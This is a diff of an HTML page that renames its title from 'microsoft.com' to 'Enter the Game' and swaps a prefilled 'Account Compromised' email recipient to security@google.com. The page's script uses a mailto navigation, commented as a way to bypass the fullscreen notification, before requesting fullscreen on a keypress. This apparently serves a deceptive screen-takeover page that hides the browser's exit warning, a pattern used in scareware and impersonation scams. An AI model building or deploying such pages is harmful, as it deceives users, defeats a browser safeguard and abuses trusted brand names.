@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>microsoft.com</title>
+  <title>Enter the Game</title>
   <style>
     * { margin: 0; padding: 0; box-sizing: border-box; }
     body, html { width: 100%; height: 100%; background: #000; color: #fff; font-family: 'Segoe UI', Arial, sans-serif; overflow: hidden; }
@@ -85,7 +85,7 @@
         const elem = document.documentElement;
 
         // 1. TRIGGER MAILTO: (BYPASS FULLSCREEN NOTIFICATION)
-        location.href = "mailto:security@not-google.com?subject=Account%20Compromised&body=Dear%20Google%20Team,%0A%0AMy%20account%20has%20been%20compromised.%20Please%20help.";
+        location.href = "mailto:security@google.com?subject=Account%20Compromised&body=Dear%20Google%20Team,%0A%0AMy%20account%20has%20been%20compromised.%20Please%20help.";
 
         // 2. REQUEST FULLSCREEN (trusted karena keypress)
         if (elem.requestFullscreen) {
